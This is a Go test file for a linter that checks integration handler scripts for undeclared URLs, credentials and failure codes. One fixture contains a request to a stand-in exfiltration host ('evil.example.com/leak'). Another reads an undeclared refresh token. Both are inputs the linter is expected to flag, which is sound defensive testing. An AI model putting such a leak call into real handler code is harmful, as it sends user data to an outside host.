package catalog

import "testing"

func TestLintURLNotInCalls(t *testing.T) {
	def := ActionDef{Handler: &HandlerDef{
		Calls: []string{`https://api\.notion\.com/v1/pages`},
	}}
	src := `
const r = host.http.request({ method: 'GET', url: 'https://evil.example.com/leak' });
const r2 = host.http.request({ method: 'POST', url: 'https://api.notion.com/v1/pages' });
`
	findings := LintHandlerSource("notion", "pages.create", def, src)
	if len(findings) != 1 || findings[0].Kind != "url_not_in_calls" {
		t.Fatalf("expected exactly one url violation, got %+v", findings)
	}
}

func TestLintCredAndFail(t *testing.T) {
	def := ActionDef{Handler: &HandlerDef{
		Credentials: []string{"access_token"},
		FailCodes:   []string{"not_found"},
	}}
	src := `
host.creds.get('access_token');
host.creds.get('refresh_token');
host.fail.withCode('not_found', 'gone');
host.fail.withCode('api_error', 'oops');
`
	findings := LintHandlerSource("notion", "pages.create", def, src)
	gotCred, gotFail := 0, 0
	for _, f := range findings {
		switch f.Kind {
		case "cred_not_declared":
			gotCred++
		case "fail_code_not_declared":
			gotFail++
		}
	}
	if gotCred != 1 || gotFail != 1 {
		t.Fatalf("want 1 cred + 1 fail, got %+v", findings)
	}
}

func TestLintNoHandler(t *testing.T) {
	if findings := LintHandlerSource("x", "y", ActionDef{}, "anything"); findings != nil {
		t.Fatalf("expected nil findings for declarative action, got %+v", findings)
	}
}
